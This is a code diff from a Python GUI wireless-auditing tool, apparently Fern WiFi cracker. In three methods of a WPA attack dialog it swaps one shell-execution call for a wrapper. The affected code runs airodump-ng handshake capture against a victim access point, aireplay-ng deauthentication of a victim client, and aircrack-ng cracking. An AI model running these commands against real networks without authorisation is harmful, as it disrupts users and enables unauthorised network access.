@@ -480,14 +480,14 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
 
     def wpa_capture(self):
         monitor_interface = variables.monitor_interface
-        commands.getstatusoutput('%s airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(variables.xterm_setting,variables.victim_mac,variables.victim_channel,monitor_interface))
+        variables.exec_command('%s airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(variables.xterm_setting,variables.victim_mac,variables.victim_channel,monitor_interface))
 
     def deauthenticate_client(self):
         monitor_interface = variables.monitor_interface
-        commands.getstatusoutput('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,variables.victim_mac,select_client,monitor_interface))
+        variables.exec_command('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,variables.victim_mac,select_client,monitor_interface))
 
     def capture_check(self):
-        commands.getstatusoutput('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')
+        variables.exec_command('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')
 
     def capture_loop(self):
         time.sleep(3)
